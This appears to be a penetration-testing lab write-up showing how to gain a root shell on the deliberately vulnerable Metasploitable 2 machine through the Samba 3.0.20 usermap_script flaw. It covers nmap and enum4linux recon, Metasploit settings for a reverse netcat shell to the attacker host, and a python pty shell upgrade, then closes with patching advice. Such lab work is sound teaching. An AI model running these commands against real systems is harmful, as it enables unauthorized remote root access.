# Metasploitable 2 – SMB (Samba 3.0.20) Exploit

## 1. Goal

Exploit a vulnerable Samba 3.0.20 service on Metasploitable 2 to gain a remote root shell using the `usermap_script` Metasploit module.

Target:
- Metasploitable 2 IP: `192.168.0.102`

---

## 2. Recon – Find SMB ports and version

**Terminal 1**

```bash
nmap -p 139,445 192.168.0.102 -sC -sV
```

Key results:
- `139/tcp` open – netbios-ssn, Samba smbd 3.X–4.X
- `445/tcp` open – Samba smbd 3.0.20-Debian
- Hostname: `metasploitable`
- Workgroup: `WORKGROUP`
- Message signing: disabled

This confirms SMB is running and shows the exact Samba version.
<img width="966" height="717" alt="image" src="https://github.com/user-attachments/assets/997d6663-63cb-4410-83ec-59792bbbc1c4" />
---

## 3. SMB enumeration with enum4linux

**Terminal 1**

```bash
enum4linux -a 192.168.0.102
```

Important findings:
- OS: Unix (Samba 3.0.20-Debian)
- Workgroup: `WORKGROUP`
- Users: `root`, `msfadmin`, `user`, `postgres`, `ftp`, etc.
- Shares:
  - `print$` – Printer drivers
  - `tmp` – world-writable temp share
  - `opt`
  - `IPC$`
  - `ADMIN$`
- Password policy:
  - Minimum password length: 5
  - Complexity: disabled

This confirms we are dealing with an old, weakly configured Samba server.
<img width="1130" height="865" alt="image" src="https://github.com/user-attachments/assets/0271bffd-6ab0-4c5c-8fb9-28bbd19e013c" />

---

## 4. Finding an exploit with SearchSploit

**Terminal 1**

```bash
searchsploit "Samba 3.0"
```

Relevant result:

- `Samba 3.0.20 < 3.0.25rc3 - "Username" map script Command Execution (Metasploit)`
- Metasploit module: `exploit/multi/samba/usermap_script`

This vulnerability lets us execute commands on the server via a malicious username map script.
<img width="1076" height="458" alt="image" src="https://github.com/user-attachments/assets/fd6cb621-c6e6-4339-bb3c-d41f9f6f1692" />

---

## 5. Exploitation with Metasploit

### 5.1 Start Metasploit and load the module

**Terminal 1**

```bash
msfconsole
search samba 3.0.20
use exploit/multi/samba/usermap_script
show options
```
<img width="1123" height="863" alt="image" src="https://github.com/user-attachments/assets/443261f4-07c5-4385-96e4-dd5fa386257f" />

Default payload: `cmd/unix/reverse_netcat`.

### 5.2 Set target and listener options

Set the Metasploitable 2 IP and your Kali IP:

```bash
set RHOSTS 192.168.0.102
set RPORT 139
set LHOST 192.168.0.115   # your Kali IP
set LPORT 4444
```
<img width="1131" height="608" alt="image" src="https://github.com/user-attachments/assets/204fca17-59e9-441b-a3a0-a397c0c4a947" />


### 5.3 Run exploit and get a shell

```bash
run
```

Metasploit opens a reverse shell:

- `Command shell session 1 opened (192.168.0.115:4444 -> 192.168.0.102:47278)`

Check who you are:

```bash
whoami
```

Output:

```text
root
```
<img width="916" height="404" alt="image" src="https://github.com/user-attachments/assets/8411b613-cff9-4bcc-b8d0-d3142b349109" />

We already have root privileges from this exploit.

---

## 6. Upgrading and exploring the shell

Upgrade to a proper interactive shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```bash
ls
cd /root
ls
```

You can now browse the system as root and inspect files under `/root`.

When finished:

```bash
exit
```

This closes the shell session.

---

## 7. Security lesson

- Old Samba versions (like 3.0.20) have known remote code execution vulnerabilities and should not be exposed in production.
- Always patch and upgrade file sharing services; track CVEs for internet-facing services.
- Restrict SMB to internal networks and protect it with firewalls and network segmentation.
- Disable unnecessary shares and review password policies (here, complexity is disabled and minimum length is low).

---

## 8. Tools used

- `nmap` – service detection and version scanning  
- `enum4linux` – SMB/NetBIOS enumeration  
- `searchsploit` – exploit database lookup  
- `msfconsole` – Metasploit Framework  
- `cmd/unix/reverse_netcat` payload – reverse shell  
- `python` – PTY spawn to improve shell usability
